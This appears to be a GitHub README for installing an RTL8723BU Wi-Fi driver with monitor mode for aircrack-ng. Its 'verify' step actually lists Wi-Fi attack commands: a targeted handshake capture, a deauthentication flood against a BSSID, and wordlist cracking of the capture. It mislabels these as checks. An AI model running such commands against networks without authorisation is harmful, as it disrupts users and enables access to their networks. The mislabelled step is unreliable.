# Wifi-hacking-rtl8723bu

To use your Realtek Semiconductor Corp. RTL8723BU 802.11b/g/n WLAN Adapter with **aircrack-ng**, you may need to install specific drivers that support monitor mode and packet injection. Here's a general guide to help you with the process on a Linux system:

### Step 1: Update Your System

Before installing any drivers, make sure your system is up to date:

```bash
sudo apt update
sudo apt upgrade
```

### Step 2: Install Required Packages

You'll need some essential packages for compiling the driver:

```bash
sudo apt install build-essential dkms git
```

### Step 3: Download and Install the Driver

1. **Download the Driver Source Code**:

   You can find the driver for the RTL8723BU on GitHub. Clone the repository using the following command:

   ```bash
   git clone https://github.com/rehan5039/Wifi-hacking-rtl8723bu.git
   ```

2. **Build and Install the Driver**:

   Navigate to the downloaded directory and build the driver:

   ```bash
   cd Wifi-hacking-rtl8723bu/rtl8723bu-master
   ```

   ```bash
   cd rtl8723bu
   make
   sudo make install
   ```

4. **Load the Driver**:

   Once installed, load the driver using:

   ```bash
   sudo modprobe 8723bu
   ```

### Step 4: Enable Monitor Mode

After installing the driver, you can enable monitor mode using the following command:

```bash
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
```

*Note*: Replace `wlan0` with your actual wireless interface name if it's different.

### Step 5: Verify Installation

Verify that your adapter supports monitor mode and packet injection:

```bash
airodump-ng wlan0
```

```bash
airodump-ng -c [channel] --bssid [BSSID] -w  capture wlan0
```

```bash
aireplay-ng --deauth 10 -a [BSSID] wlan0
```

```bash
aircrack-ng capture.cap -w [wordlist]
```

You should see "Mode:Monitor" next to your wireless interface.

### Troubleshooting

- **Driver Compatibility**: If you face any issues, ensure the driver you are using is compatible with your kernel version.
- **Error Messages**: Check for error messages during the `make` or `make install` process. They can provide clues about what might be going wrong.
- **Reboot**: Sometimes, a simple reboot can help load the necessary drivers correctly.

This should set up your Wi-Fi adapter for use with **aircrack-ng**. If you encounter specific errors or issues, feel free to ask for more detailed troubleshooting!
